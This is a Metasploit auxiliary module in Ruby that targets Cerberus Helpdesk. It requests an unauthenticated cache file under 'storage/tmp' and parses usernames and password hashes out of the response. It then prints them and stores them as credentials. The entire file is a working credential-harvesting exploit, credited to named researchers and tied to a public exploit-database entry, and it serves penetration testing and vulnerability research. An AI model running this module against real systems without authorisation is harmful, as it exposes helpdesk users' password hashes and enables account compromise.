##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'         => 'Cerberus Helpdesk User Hash Disclosure',
      'Description'  => %q{
        This module extracts usernames and password hashes from the Cerberus Helpdesk
        through an unauthenticated access to a workers file.
        Verified on Version 4.2.3 Stable (Build 925) and 5.4.4
        },
      'References'   =>
        [
          [ 'EDB', '39526' ]
        ],
      'Author'       =>
        [
          'asdizzle_', # discovery
          'h00die',    # module
        ],
      'License'      => MSF_LICENSE,
      'DisclosureDate' => 'Mar 7 2016'
    )

    register_options(
      [
        OptString.new('TARGETURI', [false, 'URL of the Cerberus Helpdesk root', '/'])
      ])
  end

  def run_host(rhost)
    begin
      ['devblocks', 'zend'].each do |site|
        url = normalize_uri(datastore['TARGETURI'], 'storage', 'tmp', "#{site}_cache---ch_workers")
        vprint_status("Attempting to load data from #{url}")
        res = send_request_cgi({'uri' => url})
        if !res
          print_error("#{peer} Unable to connect to #{url}")
          next
        end

        if !res.body.include?('pass')
          print_error("Invalid response received for #{peer} for #{url}")
          next
        end

        cred_table = Rex::Text::Table.new 'Header'  => 'Cerberus Helpdesk User Credentials',
                                          'Indent'  => 1,
                                          'Columns' => ['Username', 'Password Hash']

        # the returned object looks json-ish, but it isn't. Unsure of format, so we'll do some ugly manual parsing.
        # this will be a rough equivalent to sed -e 's/s:5/\n/g' | grep email | cut -d '"' -f4,8 | sed 's/"/:/g'
        result = res.body.split('s:5')
        result.each do |cred|
          if cred.include?('email')
            cred = cred.split(':')
            username = cred[3].tr('";', '') # remove extra characters
            username = username[0...-1] # also remove trailing s
            password_hash = cred[7].tr('";', '') # remove extra characters
            print_good("Found: #{username}:#{password_hash}")
            store_valid_credential(
              user:         username,
              private:      password_hash,
              private_type: :nonreplayable_hash
            )
            cred_table << [username, password_hash]
          end
        end
        print_line
        print_line cred_table.to_s
        break
      end

    rescue ::Rex::ConnectionError
      print_error("#{peer} Unable to connect to site")
      return
    end
  end
end
